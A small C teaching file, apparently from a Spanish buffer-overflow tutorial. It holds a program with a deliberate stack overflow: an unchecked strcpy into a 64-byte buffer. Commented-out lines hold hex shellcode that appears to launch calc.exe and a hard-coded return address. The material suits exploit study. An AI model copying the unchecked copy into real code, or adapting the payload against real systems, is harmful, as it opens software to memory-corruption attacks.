/* vuln1.c por Rojodos */

#include <stdio.h>  
#include <string.h>

int main (int argc, char **argv){  
    char buffer[64] = ""; 
	//char buff[1024]  = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ";
    //char shellcode[] = "\x55\x8b\xec\x33\xff\x57\x83\xec\x08\xc6\x45\xf7\x63\xc6\x45\xf8\x61\xc6\x45\xf9\x6c\xc6\x45\xfa\x63\xc6\x45\xfb\x2e\xc6\x45\xfc\x65\xc6\x45\xfd\x78\xc6\x45\xfe\x65\x8d\x45\xf7\x50\xbb\xc7\x93\xc2\x77\xff\xd3";
    //char offset[]    = "\x7B\x46\x86\x7C"; //0x7C 86 46 7B

    //strcat(buff, offset);       
    //strcat(buff, shellcode);    

    if (argc < 2) {  // Si los argumentos son menores que 2...
        printf ("Introduzca un argumento al programa\n"); //Printeamos   
        return 0;  // y retornamos 0 a la función main, y el programa acaba
    }
    strcpy(buffer, argv[1]); // Aqui es donde esta el fallo.

    return 0;  // Devolvemos 0 a main, y el programa acaba.

}
